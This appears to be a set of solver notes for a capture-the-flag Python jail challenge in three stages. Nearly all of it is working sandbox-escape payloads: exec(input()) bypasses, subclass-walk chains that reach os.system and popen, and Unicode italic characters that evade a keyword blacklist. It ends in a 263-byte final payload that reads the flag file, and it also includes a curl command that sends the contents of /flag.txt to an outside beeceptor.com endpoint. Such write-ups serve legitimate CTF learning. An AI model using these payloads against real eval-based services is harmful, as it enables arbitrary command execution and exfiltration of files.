# Solve 1:
# max 30 characters, open is removed
# exec(input())
# import os;os.system('cat flag.txt')

# Solve 2
# max 15 characters, open and imports are removed

"""
1. exec(input())

2. print(().__class__.__mro__[1].__subclasses__())

for i,j in enumerate(x):
    if "importer" in str(j).lower(): print(i,j)

# 
3. find index of <class '_frozen_importlib.BuiltinImporter'>
().__class__.__mro__[1].__subclasses__()[120]().load_module('os').system('cat flag.txt')
"""

# Solve 3
𝑒𝓍𝑒𝒸(𝒾𝓃𝓅𝓊𝓉())

𝚙𝚛𝚒𝚗𝚝
"""
https://lingojam.com/FancyTextGenerator

# is wrap_close
().__class__.__mro__[1].__subclasses__()[140]().load_module('os').system('cat flag.txt')

().__class__.__base__.__subclasses__()[140].__init__.__globals__["popen"]("cat flag.txt")
https://blog.pepsipu.com/posts/albatross-redpwnctf


curl -X POST -d `cat /flag.txt` https://asdfasdfasdf.free.beeceptor.com




"""

# ().__class__.__base__.__subclasses__()[140].__init__.__globals__["popen"]("curl -X POST -d `cat ./flag.txt` https://asdfasdfasdf.free.beeceptor.com")


"""
0. italicise characters to bypass blacklist

1. first get access to popen

[*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][-5]

- because italicised characters dont work to index the dictionary, unpack the dictionary into an array

2. call a command and call read()

[*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][-5]("cat flag.txt").read()

3. because the italicised characters dont work inside bash command, and format string doesnt work with italicised f

- use doc strings to construct "cat"
- command substitution to write out "./flag.txt"
"{} ./????.???".𝘧𝘰𝘳𝘮𝘢𝘵(().__𝘥𝘰𝘤__[-3] + ().__𝘥𝘰𝘤__[-11] + ().__𝘥𝘰𝘤__[-2]))

4. because we only have an eval() we dont get access to output, so you can go through the same method to unpack a `print`
[*[*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][6].𝘷𝘢𝘭𝘶𝘦𝘴()][42]


final payload # 263 bytes
[*[*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][6].𝘷𝘢𝘭𝘶𝘦𝘴()][42]([*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][-5]("{} ./????.???".𝘧𝘰𝘳𝘮𝘢𝘵(().__𝘥𝘰𝘤__[-3] + ().__𝘥𝘰𝘤__[-11] + ().__𝘥𝘰𝘤__[-2])).𝘳𝘦𝘢𝘥())

"""